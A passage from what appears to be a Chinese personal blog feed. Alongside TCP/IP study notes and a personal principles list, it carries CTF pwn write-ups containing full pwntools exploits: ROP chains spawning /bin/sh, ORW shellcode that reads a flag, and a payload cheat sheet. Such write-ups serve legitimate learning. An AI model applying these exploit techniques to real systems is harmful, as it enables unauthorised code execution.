id="第一章协议组成"><a href="#第一章协议组成" class="headerlink" title="第一章协议组成"></a>第一章协议组成</h1><ul><li>语义</li><li>语法</li><li>时序</li></ul><h2 id="OIS七层模型"><a href="#OIS七层模型" class="headerlink" title="OIS七层模型"></a>OIS七层模型</h2><table><thead><tr><th align="center">层次</th><th align="center">名称</th><th align="center">功能</th></tr></thead><tbody><tr><td align="center">应用层</td><td align="center">报文/消息</td><td align="center"></td></tr><tr><td align="center">表示层</td><td align="center"></td><td align="center">定义数据格式和加密标准。将一种格式转换成另一种格式</td></tr><tr><td align="center">会话层</td><td align="center"></td><td align="center">验证会话双方，提供身份验证</td></tr><tr><td align="center">传输层</td><td align="center">段</td><td align="center">网络节点之间的可靠数据传输</td></tr><tr><td align="center">网络层</td><td align="center">包</td><td align="center"></td></tr><tr><td align="center">链路层</td><td align="center">帧</td><td align="center"></td></tr><tr><td align="center">物理层</td><td align="center">流</td><td align="center"></td></tr></tbody></table><h2 id="TCP-IP四层"><a href="#TCP-IP四层" class="headerlink" title="TCP/IP四层"></a>TCP/IP四层</h2><table><thead><tr><th>层次</th><th></th><th></th></tr></thead><tbody><tr><td>应用层</td><td></td><td></td></tr><tr><td>传输层</td><td>提供端到端通信</td><td></td></tr><tr><td>网络层</td><td>IP数据包传输、路由选择、流量控制和拥塞控制</td><td></td></tr><tr><td>网络接口层</td><td></td><td></td></tr></tbody></table><img src="2020/02/08/TCPIP%E5%A4%8D%E4%B9%A0/image-20200104164157071.png" srcset="/img/loading.gif" class="" title="image-20200104164157071"><img src="2020/02/08/TCPIP%E5%A4%8D%E4%B9%A0/image-20200104164216242.png" srcset="/img/loading.gif" class="" title="image-20200104164216242"><h2 id="记忆"><a href="#记忆" class="headerlink" title="记忆"></a>记忆</h2><p>以太网MTU最大传输单元，最大值1500字节</p><p>基本概念：协议，封装，服务，接口</p><h1 id="第二章局域网协议"><a href="#第二章局域网协议" class="headerlink" title="第二章局域网协议"></a>第二章局域网协议</h1><p>IEEE802.3 CSMA/CD 总线媒体访问</p><p>802.4 令牌总线</p><p>802.5 令牌环</p><h2 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a>数据链路层</h2><p>逻辑链路控制子层</p><p>介质访问控制子层</p><h2 id="MAC寻址"><a href="#MAC寻址" class="headerlink" title="MAC寻址"></a>MAC寻址</h2><p>广播帧：目的MAC为广播地址（全1）</p><h2 id="Ethernet-II帧格式"><a href="#Ethernet-II帧格式" class="headerlink" title="Ethernet II帧格式"></a>Ethernet II帧格式</h2><h2 id="记忆-1"><a href="#记忆-1" class="headerlink" title="记忆"></a>记忆</h2><p>交换机工作在数据链路层</p><p>冲突域：每个节点都能接收到所有被发送的帧</p><p>广播域：能接收任一发出的广播</p><p>路由器隔绝广播</p><p>网桥：有两网卡，接两端线缆</p><p>链路层协议：IEEE802.3 .4 .5 SLIP(串行线路Internet协议)，CSLIP()，PPP(点对点)</p><p>SLIP：需要先知道ip，并且没有校验</p><h1 id="第三章地址解析协议"><a href="#第三章地址解析协议" class="headerlink" title="第三章地址解析协议"></a>第三章地址解析协议</h1><p>ARP和RARP</p><p>静态映射：通过地址映射表与物理地址之间的映射</p><p>动态映射：自动维护逻辑地址和物理地址</p><h2 id="ARP"><a href="#ARP" class="headerlink" title="ARP"></a>ARP</h2><p>广播请求，单播相应</p><p>物理层广播，IP路由（网络层）不会转发</p><h3 id="跨子网的地址解析"><a href="#跨子网的地址解析" class="headerlink" title="跨子网的地址解析"></a>跨子网的地址解析</h3><p>？？</p><h2 id="记忆-2"><a href="#记忆-2" class="headerlink" title="记忆"></a>记忆</h2><p>若分配dhcp到的ip为169.254开头，说明dhcp服务有问题</p><h1 id="第四章IP协议"><a href="#第四章IP协议" class="headerlink" title="第四章IP协议"></a>第四章IP协议</h1><p>分片数据大小必须为8字节的整数倍，否则无法表述偏移量</p><h1 id="第五章ICMP协议"><a href="#第五章ICMP协议" class="headerlink" title="第五章ICMP协议"></a>第五章ICMP协议</h1><p>功能</p><ul><li>报告差错</li><li>查询</li></ul><h2 id="差错报文"><a href="#差错报文" class="headerlink" title="差错报文"></a>差错报文</h2><p>差错报告报文：当路由器或目的主机处理IP数据报遇到问题时，查询报文以请求/应答形式成对出现</p><p>差错报告报文：源抑制 源站抑制报告，降低源发包速度</p><p>目的不可达：网络不可达，主机不可达，协议不可达和端口不可达</p><p>网络不可达可能路由表或者目的地址有错。主机不可达可能信宿机不在运行中或不存在，并说明网络可达。</p><h3 id="超时"><a href="#超时" class="headerlink" title="超时"></a>超时</h3><p>目的主机进行分片重组时会启动重组计时器，一旦超时就会丢弃正在重组的数据报，并产生ICMP数据报超时报告 </p><h3 id="重定向报文"><a href="#重定向报文" class="headerlink" title="重定向报文"></a>重定向报文</h3><p>路由收到报文后，判断是否最佳选择，不是就发送重定向报文，通知源主机修改路由表，最佳下一跳路由器的IP地址</p><h3 id="计算应答时间"><a href="#计算应答时间" class="headerlink" title="计算应答时间"></a>计算应答时间</h3><img src="2020/02/08/TCPIP%E5%A4%8D%E4%B9%A0/image-20200104202342626.png" srcset="/img/loading.gif" class="" title="image-20200104202342626"><h2 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h2><p>ping和tracert</p><h1 id="第六章IP路由"><a href="#第六章IP路由" class="headerlink" title="第六章IP路由"></a>第六章IP路由</h1><p>##RIP 距离向量路由协议</p><p>==通过度量值判断路径的好坏==</p><p>包含：路径长度，跳数，可靠性，延迟，带宽，负载，通讯费用</p><p>RIP V1 不支持VLSM V2 支持认证</p><h2 id="OSPF-链路状态路由协议"><a href="#OSPF-链路状态路由协议" class="headerlink" title="OSPF 链路状态路由协议"></a>OSPF 链路状态路由协议</h2><p>==通过管理距离判断路径好坏==</p><p>每种路径由协议分配信任等级，根据算法的好坏</p><h2 id="BGP协议"><a href="#BGP协议" class="headerlink" title="BGP协议"></a>BGP协议</h2><p>边界网关协议，用于自治系统之间</p><h1 id="第七章-TCP-UDP"><a href="#第七章-TCP-UDP" class="headerlink" title="第七章 TCP UDP"></a>第七章 TCP UDP</h1><p>小于1024端口做公用端口，全局方式进行分配</p><p>1024～65535 临时端口</p><h2 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h2><p>面向字节流。TCP使用缓冲区</p><h3 id="三次握手"><a href="#三次握手" class="headerlink" title="三次握手"></a>三次握手</h3><p>SEQ 是随机数</p><p>客户端</p><p>第一次：SEQ = m , SYN = 1</p><p>服务器</p><p>第二次：SEQ = n，AN = m + 1，SYN=1，ACK=1</p><p>客户端</p><p>第三次：SEQ = m + 1 , AN = n +1 , ACK = 1</p><h2 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h2><p>面向报文 使用队列</p><h1 id="第九章DHCP协议"><a href="#第九章DHCP协议" class="headerlink" title="第九章DHCP协议"></a>第九章DHCP协议</h1><p>169.254 本地链路地址</p><h2 id="DHCP报文格式"><a href="#DHCP报文格式" class="headerlink" title="DHCP报文格式"></a>DHCP报文格式</h2><p>网关IP地址 如果跨网段使用DHCP中继，此字段包含中继代理的ip地址</p><h1 id="第十章应用层协议"><a href="#第十章应用层协议" class="headerlink" title="第十章应用层协议"></a>第十章应用层协议</h1><p>windows域 WINS协议</p><p>DNS递归解析，反向解析</p>]]></content>
    
    
    <categories>
      
      <category>专业学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>专业学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>强网杯2019_拟态-STKOF</title>
    <link href="/2020/02/08/%E5%BC%BA%E7%BD%91%E6%9D%AF2019_%E6%8B%9F%E6%80%81-STKOF/"/>
    <url>/2020/02/08/%E5%BC%BA%E7%BD%91%E6%9D%AF2019_%E6%8B%9F%E6%80%81-STKOF/</url>
    
    <content type="html"><![CDATA[<h1 id="强网杯2019-拟态-STKOF"><a href="#强网杯2019-拟态-STKOF" class="headerlink" title="强网杯2019_拟态-STKOF"></a>强网杯2019_拟态-STKOF</h1><p>这题给了两文件，分别是32和64位的，32位的由于是静态链接，直接自动生成就能打通。</p><p>打到buu服务器上时，exp是随机打到两个程序中的一个的，就我测试来看64位的出现多点</p><p>搜了一搜，当时比赛好像是要一个exp打通两个程序才行</p><p>备份学习链接：</p><p><a href="https://blog.csdn.net/qq_41071646/article/details/90607928" target="_blank" rel="noopener">强网杯 签到re 签到pwn 题解</a></p><p><a href="https://www.anquanke.com/post/id/195801?from=singlemessage" target="_blank" rel="noopener">拟态防御型Pwn题做题思路总结</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>buu</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ROPgadget&amp;系统调用-cmcc_simplerop</title>
    <link href="/2020/02/08/ROPgadget&amp;%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8-cmcc_simplerop/"/>
    <url>/2020/02/08/ROPgadget&amp;%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8-cmcc_simplerop/</url>
    
    <content type="html"><![CDATA[<h1 id="ROPgadget-amp-系统调用-cmcc-simplerop"><a href="#ROPgadget-amp-系统调用-cmcc-simplerop" class="headerlink" title="ROPgadget&amp;系统调用-cmcc_simplerop"></a>ROPgadget&amp;系统调用-cmcc_simplerop</h1><img src="2020/02/08/ROPgadget&%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8-cmcc_simplerop/image-20200204141031239.png" srcset="/img/loading.gif" class="" title="image-20200204141031239"><img src="2020/02/08/ROPgadget&%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8-cmcc_simplerop/image-20200204141049853.png" srcset="/img/loading.gif" class="" title="image-20200204141049853"><p>第一反应就是用ROPgadget自动生成ropchains</p><p>但在这里不行，算出来的偏移是0x20，那么只有68字节给ropchains了</p><img src="2020/02/08/ROPgadget&%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8-cmcc_simplerop/image-20200204141245719.png" srcset="/img/loading.gif" class="" title="image-20200204141245719"><p>而自动生成的都太长了= =，只能手动调整ropchains长度</p><blockquote><p>参考<a href="http://m4x.fun/post/hitcon-training-writeup/" target="_blank" rel="noopener">http://m4x.fun/post/hitcon-training-writeup/</a></p></blockquote><pre><code class="python">    from struct import pack     pop_edx_ecx_ebx = 0x0806e850    payload = cyclic(0x14 + 12)     p = lambda x : pack(&#39;I&#39;, x)    IMAGE_BASE_0 = 0x08048000 # ./simplerop    rebase_0 = lambda x : p(x + IMAGE_BASE_0)    rop = &#39;&#39;    rop += rebase_0(0x00072e06) # 0x080bae06: pop eax; ret;     rop += &#39;/bin&#39;    rop += rebase_0(0x0002682a) # 0x0806e82a: pop edx; ret;     rop += rebase_0(0x000a3060)    rop += rebase_0(0x0005215d) # 0x0809a15d: mov dword ptr [edx], eax; ret;     rop += rebase_0(0x00072e06) # 0x080bae06: pop eax; ret;     rop += &#39;/sh\x00&#39;    rop += rebase_0(0x0002682a) # 0x0806e82a: pop edx; ret;     rop += rebase_0(0x000a3064)    rop += rebase_0(0x0005215d) # 0x0809a15d: mov dword ptr [edx], eax; ret;    rop += pack(&#39;I&#39;, pop_edx_ecx_ebx)    rop += p(0)    rop += p(0)    rop += rebase_0(0x000a3060)    rop += rebase_0(0x00072e06) # 0x080bae06: pop eax; ret;     rop += p(0x0000000b)    rop += rebase_0(0x00026ef0) # 0x0806eef0: int 0x80; ret;</code></pre><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><pre><code class="python"># -*- coding: utf-8 -*-from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;elf = ELF(&#39;./simplerop&#39;)lib = 0sh = 0def pwn(ip,port,debug):    global lib    global sh    if debug == 1:        sh = process(&#39;./simplerop&#39;)        #lib = ELF(&#39;&#39;)    else:        sh = remote(ip,port)        #lib = ELF(&#39;./home/mrbelieve/Desktop/PWN/buu/libc/32-libc-2.23.so&#39;)    from struct import pack     pop_edx_ecx_ebx = 0x0806e850    payload = cyclic(0x14 + 12)     p = lambda x : pack(&#39;I&#39;, x)    IMAGE_BASE_0 = 0x08048000 # ./simplerop    rebase_0 = lambda x : p(x + IMAGE_BASE_0)    rop = &#39;&#39;    rop += rebase_0(0x00072e06) # 0x080bae06: pop eax; ret;     rop += &#39;/bin&#39;    rop += rebase_0(0x0002682a) # 0x0806e82a: pop edx; ret;     rop += rebase_0(0x000a3060)    rop += rebase_0(0x0005215d) # 0x0809a15d: mov dword ptr [edx], eax; ret;     rop += rebase_0(0x00072e06) # 0x080bae06: pop eax; ret;     rop += &#39;/sh\x00&#39;    rop += rebase_0(0x0002682a) # 0x0806e82a: pop edx; ret;     rop += rebase_0(0x000a3064)    rop += rebase_0(0x0005215d) # 0x0809a15d: mov dword ptr [edx], eax; ret;    rop += pack(&#39;I&#39;, pop_edx_ecx_ebx)    rop += p(0)    rop += p(0)    rop += rebase_0(0x000a3060)    rop += rebase_0(0x00072e06) # 0x080bae06: pop eax; ret;     rop += p(0x0000000b)    rop += rebase_0(0x00026ef0) # 0x0806eef0: int 0x80; ret;     sh.sendline(payload + rop)    sh.interactive()if __name__ ==  &quot;__main__&quot;:    pwn(&quot;node3.buuoj.cn&quot;,25335,0 )</code></pre><h2 id="另一种解法"><a href="#另一种解法" class="headerlink" title="另一种解法"></a>另一种解法</h2><blockquote><p>新姿势 &gt;rop chain后 int 0x80中断从而执行系统调用&gt; execve(/bin/sh)。</p><p>原理：通过一系列 pop|ret 等gadget，使得 eax = 0xb（execve 32 位下的系统调用号），ebx -&gt; /bin/sh， ecx = edx = 0，然后通过 int 0x80 实现系统调用，执行 execve(“/bin/sh”, 0, 0)<br>————————————————<br>版权声明：本文为CSDN博主「Yof3ng」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/qq_40173126/article/details/83348870" target="_blank" rel="noopener">https://blog.csdn.net/qq_40173126/article/details/83348870</a></p><p>版权声明：本文为CSDN博主「Yof3ng」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。<br>[原文链接])(<a href="https://blog.csdn.net/qq_40173126/article/details/83348870" target="_blank" rel="noopener">https://blog.csdn.net/qq_40173126/article/details/83348870</a>)</p></blockquote><pre><code class="python">#coding:utf-8from pwn import*  p = process(&#39;./simplerop&#39;)  elf = ELF(&#39;./simplerop&#39;)  pop_edx_ecx_ebx = 0x0806eca0  pop_eax = 0x080b7e26  pop_edx = 0x0806ec7a  int_80 = 0x0806c8f5  gadget = 0x080707b9 # mov word ptr [edx],eax  bss = elf.bss()  read_plt = elf.symbols[&#39;read&#39;]  p.recv()  payload = &#39;a&#39;*32 + p32(pop_edx) +p32(bss)+ p32(pop_eax) +&quot;/bin&quot;+ p32(gadget)  payload +=  p32(pop_edx) + p32(bss+4) + p32(pop_eax) + &quot;/sh\x00&quot; + p32(gadget)  payload += p32(pop_edx_ecx_ebx) + p32(0) + p32(0) + p32(bss) payload += p32(pop_eax) + p32(0xb)  payload += p32(int_80)  p.send(payload)  p.interactive()</code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>buu</category>
      
      <category>备忘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>-ROPgadget -系统调用号</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>解密系列笔记</title>
    <link href="/2020/02/08/%E8%A7%A3%E5%AF%86%E7%B3%BB%E5%88%97/"/>
    <url>/2020/02/08/%E8%A7%A3%E5%AF%86%E7%B3%BB%E5%88%97/</url>
    
    <content type="html"><![CDATA[<h1 id="解密系列"><a href="#解密系列" class="headerlink" title="解密系列"></a>解密系列</h1><p>ASCII编码是Unicode字符编码的一部分</p><p>系统dll属于level3，内核运行在level0. </p><h2 id="虚拟内存"><a href="#虚拟内存" class="headerlink" title="虚拟内存"></a>虚拟内存</h2><p>在保护模式下：</p><ul><li>应用程序是不会直接访问物理地址的</li><li>虚拟内存管理器通过虚拟地址的访问请求，控制所有物理地址访问</li><li>每个程序都有独立的4GB寻址空间，不同程序的地址空间是被相互隔离的。</li><li>DLL程序没有自己的“私有”空间，它们称之为动态链接库文件，它们总是被映射到其他应用程序的地址空间中的，作为其他应用程序的一部分运行。</li></ul><p>==简化了内存的管理，并可弥补物理内存的不足，另外可以防止多任务环境下各个应用程序之间的冲突==</p><p>与实地址模式下的“段地址：偏移地址”索引方式类似，虚拟地址也写成“段：偏移量”，但为段选择子。</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>基础知识</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>个人原则宪法</title>
    <link href="/2020/02/08/%E4%B8%AA%E4%BA%BA%E5%8E%9F%E5%88%99%E5%AE%AA%E6%B3%95/"/>
    <url>/2020/02/08/%E4%B8%AA%E4%BA%BA%E5%8E%9F%E5%88%99%E5%AE%AA%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h1 id="个人原则宪法"><a href="#个人原则宪法" class="headerlink" title="个人原则宪法"></a>个人原则宪法</h1><p>史蒂芬.柯维提出，以原则为导向是以终为始最有效的方法。</p><blockquote><p>李源在解读查理.芒格时说，芒格的思维方式解决了他一直以来困惑的“愚人船”命题——一群人在船舱里掌舵，但他们看不清前方；另一群人在岸上，他们能看见一切，想要为船指引方向，但是无论他们如何叫喊，船里的人都听不见。生活就像一艘愚人船，掌舵人代表过去的我们，岸上的人代表现在的我们。现在我们了解过去，却无法为过去的我们指引方向。芒格不仅是成功的投资大师，更是生活的智者，他总结了一系列“为”与“不为”的清单，作为自己的投资原则。</p><p>作者：土月君<br>链接：<a href="https://www.jianshu.com/p/7cd520b68d5e" target="_blank" rel="noopener">https://www.jianshu.com/p/7cd520b68d5e</a><br>来源：简书</p></blockquote><p>1.保持忠诚，不出轨，不搞暧昧，矛盾冲突通过有效沟通解决。</p><p>2.保持冷静，在愤怒的时候，不出口伤人，不动手伤人，保持深呼吸，直至缓解。</p><p>3.保持学习，尊崇内心的追寻和梦想，不卑不亢，独立思考。</p><p>4.保持爱心，珍惜所拥有的东西，尽可能做到节约。</p><p>5.开源节流，不花无意义的钱，购物前都思考是否必要，是否必须，尽早达到退休存款的4.2%为年开销。</p><p>6.享受生活，享受人生，高光时期不高傲，低谷时期不绝望，珍惜每一天。</p><p>7.保持自信，相信自己，相信亲近的人，相信爱人。</p><blockquote><p>2020/2/8 2:35 第一版</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>-个人原则宪法</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ORW-[极客大挑战2019]Not_Bad</title>
    <link href="/2020/02/08/ORW-%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019%5DNot_Bad/"/>
    <url>/2020/02/08/ORW-%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019%5DNot_Bad/</url>
    
    <content type="html"><![CDATA[<h1 id="ORW-极客大挑战2019-Not-Bad"><a href="#ORW-极客大挑战2019-Not-Bad" class="headerlink" title="ORW-[极客大挑战2019]Not_Bad"></a>ORW-[极客大挑战2019]Not_Bad</h1><img src="2020/02/08/ORW-%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019%5DNot_Bad/image-20200203001107437.png" srcset="/img/loading.gif" class="" title="image-20200203001107437"><h2 id="RWX"><a href="#RWX" class="headerlink" title="RWX"></a>RWX</h2><blockquote><ul><li>Linux的文件和目录的权限，有RWX三种。</li><li>r(Read，读取)：对文件而言，具有读取文件内容的权限；对目录来说，具有<strong>浏览目录</strong>的权限。</li><li>w(Write,写入)：对文件而言，具有新增,修改,删除文件内容的权限；对目录来说，具有<strong>新建，删除，修改，移动目录内文件</strong>的权限。</li><li>x(eXecute，执行)：对文件而言，具有执行文件的权限；对目录了来说<strong>该用户具有进入目录</strong>的权限</li></ul></blockquote><img src="2020/02/08/ORW-%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019%5DNot_Bad/image-20200203144946071.png" srcset="/img/loading.gif" class="" title="image-20200203144946071"><p><a href="[https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/](https://blog.betamao.me/2019/01/23/Linux沙箱之seccomp/)">什么是seccomp</a></p><p>用<a href="https://github.com/david942j/seccomp-tools" target="_blank" rel="noopener">seccomp-tools</a>检测一下<code>seccomp-tools dump  ./bad</code></p><img src="2020/02/08/ORW-%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019%5DNot_Bad/image-20200203145031485.png" srcset="/img/loading.gif" class="" title="image-20200203145031485"><p>可运行open,read,write，也就是ORW</p><h2 id="关键点"><a href="#关键点" class="headerlink" title="关键点"></a>关键点</h2><img src="2020/02/08/ORW-%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019%5DNot_Bad/image-20200203145324266.png" srcset="/img/loading.gif" class="" title="image-20200203145324266"><img src="2020/02/08/ORW-%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019%5DNot_Bad/image-20200203145300314.png" srcset="/img/loading.gif" class="" title="image-20200203145300314"><p><code>void *mmap(void *start,size_t length,int prot,int flags,int fd,off_t offsize);</code></p><blockquote><p>mmap()函数的主要用途有三个：<br>1、将一个普通文件映射到内存中，通常在需要对文件进行频繁读写时使用，这样用内存读写取代I/O读写，以获得较高的性能；<br>2、将特殊文件进行匿名内存映射，可以为关联进程提供共享内存空间；<br>3、为无关联的进程提供共享内存空间，一般也是将一个普通文件映射到内存中。<br>————————————————<br>版权声明：本文为CSDN博主「为幸福写歌」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。<br><a href="https://blog.csdn.net/yzy1103203312/article/details/78286360" target="_blank" rel="noopener">原文链接</a></p></blockquote><p>总的来说就是，我们可以在这里写入orw_shellcode然后运行hhh</p><pre><code class="python">    orw_shellcode = shellcraft.open(&quot;./flag&quot;)    orw_shellcode += shellcraft.read(3,0x123000,0x30)    orw_shellcode += shellcraft.write(1,0x123000,0x30)</code></pre><p>read(3,addr,length)，3指从文件目录中读取</p><pre><code class="python">    payload = asm(shellcraft.read(0,0x123000,0x90)) + asm(&quot;mov rax,0x123000;call rax&quot;)    payload = payload.ljust(0x28,&quot;\x00&quot;)    payload += p64(0x400A01)#jmp rsp    payload += asm(&quot;sub rsp,0x30;call rsp&quot;)    sh.sendline(payload)</code></pre><p>这样子，我们溢出之后，先执行jmp rsp，然后读入到0x123000的shellcdoe，读入完成之后执行call rax运行shellcode</p><h2 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h2><pre><code class="python"># -*- coding: utf-8 -*-from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;amd64&#39;elf = ELF(&#39;./bad&#39;)lib = 0sh = 0def pwn(ip,port,debug):    global lib    global sh    if debug == 1:        sh = process(&#39;./bad&#39;)        lib = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)    else:        sh = remote(ip,port)        lib = ELF(&#39;/home/robye/Desktop/PWN/libc/64-libc-2.27.so&#39;)    orw_shellcode = shellcraft.open(&quot;./flag&quot;)    orw_shellcode += shellcraft.read(3,0x123000,0x30)    orw_shellcode += shellcraft.write(1,0x123000,0x30)    sh.recvuntil(&quot;fun!&quot;)    payload = asm(shellcraft.read(0,0x123000,0x90)) + asm(&quot;mov rax,0x123000;call rax&quot;)    payload = payload.ljust(0x28,&quot;\x00&quot;)    payload += p64(0x400A01)    payload += asm(&quot;sub rsp,0x30;call rsp&quot;)    sh.sendline(payload)    sleep(0.1)    sh.sendline(asm(orw_shellcode))    sh.interactive()if __name__ ==  &quot;__main__&quot;:    pwn(&quot;node3.buuoj.cn&quot;,26591,0)</code></pre><p>向<a href="http://www.qfrost.com/PWN/geek_pwn/" target="_blank" rel="noopener">Qfroest</a>大佬学习</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>buu</category>
      
      <category>备忘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>-Shellcode -ORW</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Pwn常用指令</title>
    <link href="/2020/02/05/Pwn%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/"/>
    <url>/2020/02/05/Pwn%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<h1 id="Pwn常用"><a href="#Pwn常用" class="headerlink" title="Pwn常用"></a>Pwn常用</h1><p><code>ldd filename</code> 读取libc</p><p><code>ROPgadget --binary filename --only &quot;pop|ret&quot;</code></p><p><code>__libc_start_main = u64(sh.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&#39;\x00&#39;))</code></p><p><code>__libc_start_main = u32(sh.recvuntil(&quot;\xf7&quot;)[-4:])</code></p><p><code>__libc_start_main = u32(sh.recv(4))</code></p><p><code>canary =  u64(sh.recv(7).rjust(8,&quot;\x00&quot;)) log.success(&quot;canary------&gt;&quot; + hex(canary))</code></p><p>接受成int型地址：<code>str_addr = int(sh.recvuntil(&quot;\n&quot;,True),16)</code></p><p><code>seccomp-tools dump ./filename</code></p><p>找不到flag：<code>grep -rn flag *</code></p><p>32位</p><p>第一个放在rdi 第二个放在rsi 第三个放在rdx</p><p>64位就得</p><h1 id="ubuntu16"><a href="#ubuntu16" class="headerlink" title="ubuntu16"></a>ubuntu16</h1><h2 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h2><h3 id="print"><a href="#print" class="headerlink" title="print"></a>print</h3><pre><code class="python">    payload += p32(printf_plt)    payload += p32(start_vuln)    payload += p32(0x080486F8)    payload += p32(elf.got[&#39;__libc_start_main&#39;])</code></pre><h3 id="system-“-bin-sh”"><a href="#system-“-bin-sh”" class="headerlink" title="system(“/bin/sh”)"></a>system(“/bin/sh”)</h3><pre><code class="python">payload += p32(system)payload += p32(0)payload += p32(binsh)sh.sendline(payload)</code></pre><h3 id="write"><a href="#write" class="headerlink" title="write"></a>write</h3><pre><code class="python">payload += p32(elf.plt[&#39;write&#39;])payload += p32(pop_esi_edi_ebp_ret)payload += p32(1)payload += p32(elf.got[&#39;__libc_start_main&#39;])payload += p32(4)payload += p32(start_main)</code></pre><h3 id="read"><a href="#read" class="headerlink" title="read"></a>read</h3><pre><code class="python">payload += p32(elf.plt[&#39;read&#39;])payload += p32(pop3_ret)payload += p32(0)    #从哪里读取payload += p32(bss_addr)payload += p32(0x223) #长度</code></pre><h2 id="64"><a href="#64" class="headerlink" title="64"></a>64</h2><p>1.</p><pre><code class="python">main_arena = u64(io.recv(6).ljust(8,&#39;\x00&#39;))-88log.success(&#39;main arena: &#39;+hex(main_arena))libc_base = main_arena - 0x3c4b20log.success(&#39;libc base: &#39;+hex(libc_base))2.</code></pre><pre><code class="python">libc_base = u64(sh.recv(8)) - 0x3C4B78malloc_hook = libc_base + libc.symbols[&#39;__malloc_hook&#39;]log.success(&quot;libc_base: &quot; + hex(libc_base))log.success(&quot;__malloc_hook: &quot; + hex(malloc_hook))</code></pre><h3 id="system"><a href="#system" class="headerlink" title="system"></a>system</h3><pre><code class="python">payload += p64(pop_rdi_ret)payload += p64(binsh)payload += p64(system)sh.sendline(payload)</code></pre><h3 id="printf"><a href="#printf" class="headerlink" title="printf"></a>printf</h3><pre><code class="python">payload += p64(pop_rdi_ret)payload += p64(elf.got[&#39;__libc_start_main&#39;])payload += p64(elf.plt[&#39;printf&#39;])payload += p64(start_main)</code></pre><h3 id="write-1"><a href="#write-1" class="headerlink" title="write"></a>write</h3><pre><code class="python">payload += p64(pop_rdi_ret)payload += p64(1)payload += p64(pop_rsi_r15_ret)payload += p64(elf.got[&#39;__libc_start_main&#39;])payload += p64(1)payload += p64(elf.plt[&#39;write&#39;])payload += p64(start_main)</code></pre><h1 id="ubuntu18"><a href="#ubuntu18" class="headerlink" title="ubuntu18"></a>ubuntu18</h1><h2 id="32"><a href="#32" class="headerlink" title="32"></a>32</h2><h3 id="read-1"><a href="#read-1" class="headerlink" title="read"></a>read</h3><pre><code class="python">payload =p32(elf.plt[&#39;read&#39;]) payload += p32(pop3_ret) payload += p32(0) payload += p32(base)payload += p32(0x500)</code></pre><h3 id="write-2"><a href="#write-2" class="headerlink" title="write"></a>write</h3><pre><code class="python">payload += p32(elf.plt[&#39;write&#39;])payload += p32(pop3_ret)payload += p32(1)payload += p32(elf.got[&#39;__libc_start_main&#39;])payload += p32(4)payload += p32(start_main)</code></pre><h2 id="64-1"><a href="#64-1" class="headerlink" title="64"></a>64</h2><h3 id="puts"><a href="#puts" class="headerlink" title="puts"></a>puts</h3><pre><code class="python">payload += p64(pop_rdi_ret)payload += p64(elf.got[&#39;__libc_start_main&#39;])payload += p64(elf.plt[&#39;puts&#39;])</code></pre><h3 id="system-“-bin-sh”-1"><a href="#system-“-bin-sh”-1" class="headerlink" title="system(“/bin/sh”)"></a>system(“/bin/sh”)</h3><pre><code class="python">payload += p64(pop_rdi_ret)payload += p64(binsh)payload += p64(system)sh.sendline(payload)</code></pre><h3 id="read-2"><a href="#read-2" class="headerlink" title="read"></a>read</h3><pre><code class="python">payload += p64(pop_rsi_ret)payload += p64(elf.bss()) payload += p64(elf.plt[&#39;read&#39;])</code></pre><h3 id="open"><a href="#open" class="headerlink" title="open"></a>open</h3><pre><code class="python">payload += p64(pop_rdi_ret)payload += p64(elf.bss()+0x100)payload += p64(pop_rsi_ret)payload += p64(0)payload += p64(elf.plt[&#39;open&#39;])</code></pre><h3 id="open-read-put"><a href="#open-read-put" class="headerlink" 